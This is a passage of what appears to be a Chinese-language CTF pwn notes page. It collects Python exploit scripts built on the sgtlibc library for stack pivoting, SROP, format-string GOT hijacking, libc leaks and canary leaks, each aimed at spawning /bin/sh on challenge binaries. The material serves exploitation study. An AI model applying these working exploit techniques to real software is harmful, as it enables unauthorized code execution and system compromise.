buf_start <span class="token operator">=</span> ebp <span class="token operator">-</span> <span class="token number">0x38</span>  <span class="token comment"># 查看发现ebp - buf_start = 0x38</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'ebp:{hex(ebp)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'buf_start:{hex(buf_start)}'</span><span class="token punctuation">)</span>

system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  <span class="token comment"># system要用plt，而不能用call</span>

payload <span class="token operator">=</span> <span class="token punctuation">[</span>system_addr<span class="token punctuation">,</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buf_start<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">]</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>buf_size<span class="token punctuation">,</span> b<span class="token string">'a'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>buf_start<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>  <span class="token comment"># 因为rsp会++，所以buf-4</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'leave'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 使用leave重置栈继续执行</span>
se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="SROP_syscall15_1032"></a>SROP_syscall15</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./ciscn_2019_es_7'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

syscall_ret <span class="token operator">=</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'syscall'</span><span class="token punctuation">]</span>
sigreturn_addr <span class="token operator">=</span> <span class="token number">0x4004da</span>  <span class="token comment"># mov rax,0x0f</span>
<span class="token comment"># system_addr = 0x4004E2  # mov rax,0x3b</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>  <span class="token comment"># 此题没有leave，所以只需要覆盖到s的位置即可</span>
    ret_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>rop<span class="token punctuation">[</span><span class="token string">'ret'</span><span class="token punctuation">]</span>
    r <span class="token operator">+=</span> <span class="token punctuation">[</span>ret_addr<span class="token punctuation">]</span>  <span class="token comment"># 栈平衡</span>
    <span class="token keyword">return</span> r


<span class="token comment"># 0x4004f1 # 此处注意不要切出当前函数，否则会导致抬栈从而覆盖之前写入的binsh</span>
read_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vuln'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> <span class="token punctuation">[</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> read_addr<span class="token punctuation">]</span>  <span class="token comment"># 返回到读取的地方</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

rc<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>  <span class="token comment"># 定位到系统地址位置</span>
stack_addr <span class="token operator">=</span> u00<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> stack_addr <span class="token operator">-</span> <span class="token number">0x128</span>  <span class="token comment"># 注意，本地经常性比远程会多-0x10</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>f<span class="token string">'stack:{hex(stack_addr)}'</span><span class="token punctuation">)</span>  <span class="token comment"># 泄露当前栈地址</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>f<span class="token string">'stack:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>

sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execve
sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> binsh_addr
sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x0</span>
sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x0</span>
sigframe<span class="token punctuation">.</span>rsp <span class="token operator">=</span> stack_addr
sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall_ret

payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token punctuation">[</span>sigreturn_addr<span class="token punctuation">,</span> syscall_ret<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span><span class="token punctuation">]</span>
se<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="formatstring_simplex86_1090"></a>format-string simple-x86</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./fm'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf


<span class="token keyword">def</span> <span class="token function">exec</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    start_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    info <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> info

<span class="token comment"># 通过迭代寻找格式化字符串位置</span>
offset <span class="token operator">=</span> FmtStr<span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>offset
<span class="token comment"># 格式化字符串修改指定地址</span>
g_x_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>g_x_addr<span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
start_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="formatstring_hijack_gotx64_1131"></a>format-string hijack_got-x64</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./pwn'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    start_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span>b<span class="token string">'input:\n'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    r <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> r


position <span class="token operator">=</span> formats<span class="token punctuation">.</span>exp_get_str_position<span class="token punctuation">(</span>exp<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">hijack_func_to_main_addr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    start_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
    func_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'memset'</span><span class="token punctuation">]</span>
    main_addr <span class="token operator">=</span> <span class="token number">0x400aa0</span>
    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>position<span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>func_got<span class="token punctuation">:</span> main_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span>b<span class="token string">'input:\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>


hijack_func_to_main_addr<span class="token punctuation">(</span><span class="token punctuation">)</span>

libc_main_start_position <span class="token operator">=</span> <span class="token number">25</span>
payload <span class="token operator">=</span> f<span class="token string">'%{libc_main_start_position}$p'</span>
sla<span class="token punctuation">(</span>b<span class="token string">' input name:\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
address <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token comment"># 字符串类型取其中的值</span>
address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'address'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span><span class="token string">'__libc_start_main_ret'</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>



<span class="token keyword">def</span> <span class="token function">set_printf_to_system</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">:</span>
    printf_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
    x <span class="token operator">=</span> system <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
    a <span class="token operator">=</span> x <span class="token operator">&amp;</span> <span class="token number">0xffff</span>
    a1 <span class="token operator">=</span> printf_got_addr
    b <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>
    b1 <span class="token operator">=</span> printf_got_addr<span class="token operator">+</span><span class="token number">2</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&gt;</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp <span class="token operator">=</span> a
        a <span class="token operator">=</span> b
        b <span class="token operator">=</span> tmp
        tmp <span class="token operator">=</span> a1
        a1 <span class="token operator">=</span> b1
        b1 <span class="token operator">=</span> tmp
    s <span class="token operator">=</span> f<span class="token string">"%{a}c%12$hn"</span>
    s <span class="token operator">+=</span> f<span class="token string">"%{(b-a)}c%13$hn"</span>
    s <span class="token operator">=</span> s<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s <span class="token operator">+=</span> p64<span class="token punctuation">(</span>a1<span class="token punctuation">)</span>
    s <span class="token operator">+=</span> p64<span class="token punctuation">(</span>b1<span class="token punctuation">)</span>
    <span class="token keyword">return</span> s


payload <span class="token operator">=</span> set_printf_to_system<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment"># payload = fmtstr_payload(position, {elf.got['printf']: system_addr})</span>
<span class="token comment"># print(payload)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>b<span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="formatstring_leakx64_1220"></a>format-string leak-x64</h4> 
<pre><code class="prism language-py"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./frm2-no-relro'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf

elf_base_position <span class="token operator">=</span> <span class="token number">65</span>
elf_base_offset <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x126b</span>
libc_main_start_position <span class="token operator">=</span> <span class="token number">67</span>

stack_position <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>  <span class="token comment"># 泄露栈地址</span>
stack_offset <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0x8</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    start_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span>b<span class="token string">'input:\n'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    r <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> r


<span class="token comment"># position = formats.exp_get_str_position(exp)</span>
position <span class="token operator">=</span> <span class="token number">6</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>offset2input_position<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> offset_addr<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> alias<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'address'</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> f<span class="token string">'aa.%{position+offset2input_position}$p'</span>
    sla<span class="token punctuation">(</span>b<span class="token string">'input:\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span>b<span class="token string">'aa.'</span><span class="token punctuation">)</span>
    data_line <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data_line<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>f<span class="token string">'leak {alias} : {hex(address)}'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> address <span class="token operator">+</span> offset_addr


elf_base_addr <span class="token operator">=</span> leak<span class="token punctuation">(</span>elf_base_position<span class="token punctuation">,</span> elf_base_offset<span class="token punctuation">,</span> alias<span class="token operator">=</span><span class="token string">'elf_base'</span><span class="token punctuation">)</span>
libc_main_start_addr <span class="token operator">=</span> leak<span class="token punctuation">(</span>libc_main_start_position<span class="token punctuation">,</span> alias<span class="token operator">=</span><span class="token string">'libc_main_start'</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>add_condition<span class="token punctuation">(</span><span class="token string">'__libc_start_main_ret'</span><span class="token punctuation">,</span> libc_main_start_addr<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>db_index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_system<span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> s<span class="token punctuation">.</span>get_address<span class="token punctuation">(</span>sgtlibc<span class="token punctuation">.</span>s_binsh<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'system_addr:{hex(system_addr)}'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'binsh_addr:{hex(binsh_addr)}'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> stack_position<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
    stack_addr <span class="token operator">=</span> leak<span class="token punctuation">(</span>stack_position<span class="token punctuation">,</span> stack_offset<span class="token punctuation">,</span> alias<span class="token operator">=</span><span class="token string">'stack'</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>position<span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>
    elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">+</span> elf_base_addr<span class="token punctuation">:</span> system_addr
<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">'/bin/sh|\x00'</span><span class="token punctuation">)</span>
interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<h4><a id="canary_by_formatandleakx86_1289"></a>canary by format-and-leak-x86</h4> 
<pre><code class="prism language-python"><span class="token keyword">import</span> sgtlibc
<span class="token keyword">from</span> sgtlibc<span class="token punctuation">.</span>gamebox <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> sgtlibc<span class="token punctuation">.</span>ROPgadgets
<span class="token keyword">import</span> os
set_config<span class="token punctuation">(</span>GameBoxConfig<span class="token punctuation">(</span>
    is_local<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    <span class="token builtin">file</span><span class="token operator">=</span><span class="token string">'./pwn1'</span><span class="token punctuation">,</span>
    remote<span class="token operator">=</span><span class="token string">'192.168.2.0:8888'</span><span class="token punctuation">,</span>
    auto_load<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_rop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_summary<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_start_game<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_load_shell_str<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
    auto_show_symbols<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token punctuation">)</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> sgtlibc<span class="token punctuation">.</span>Searcher<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> client<span class="token punctuation">.</span>elf
plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>

canary <span class="token operator">=</span> b<span class="token string">''</span>


<span class="token keyword">def</span> <span class="token function">exp_fmt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    start_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span>b<span class="token string">'your name:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
    rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'line'</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r


<span class="token comment"># position = formats.exp_get_str_position(exp_fmt)</span>
position <span class="token operator">=</span> <span class="token number">42</span>  <span class="token comment"># formats.exp_get_str_position(exp_fmt)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'position:{position}'</span><span class="token punctuation">)</span>
canary_pos <span class="token operator">=</span> position <span class="token operator">-</span> <span class="token number">11</span>  <span class="token comment"># 发个aaaa，调试canary位置 - aaaa的位置 / size_arch</span>
start_game<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span>b<span class="token string">'your name:'</span><span class="token punctuation">,</span> f<span class="token string">'%{canary_pos}$p'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'233'</span><span class="token punctuation">,</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 清空输出</span>
canary <span class="token operator">=</span> rc<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># canary is full-8bytes endwith 00</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'raw canary :{canary}'</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> canary<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>
<span class="token comment"># canary = int(canary,16)</span>
canary <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>canary<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># little-indian</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'canary:{canary.hex()}'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># overflow position</span>
    data <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> canary<span class="token punctuation">,</span> <span class="token punctuation">(</span>b<span class="token string">''</span> <span class="token keyword">if</span> <span class="token operator">not</span> canary <span class="token keyword">else</span> fakeebp<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> data


<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>func<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>f<span class="token string">'leak:{func}'</span><span class="token punctuation">)</span>
    <span class="token keyword">global</span> canary
    <span class="token comment"># 泄露libc</span>
    payload <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token punctuation">[</span>plt_write<span class="token punctuation">,</span> main_addr<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>func<span class="token punctuation">]</span><span class="token punctuation">]</span>
    <span class="token comment"># 如果是read的话则sa，如果是gets scanf的话则sl</span>
    sla<span class="token punctuation">(</span><span class="token string">'messages'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    <span class="token comment"># log.info(f'clear:{rl()}') # 清空输出</span>
    data <span class="token operator">=</span> rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>  <span class="token comment"># 此处直接接收</span>
    <span class="token comment"># data = rc(4)  # 32位接收4个</span>
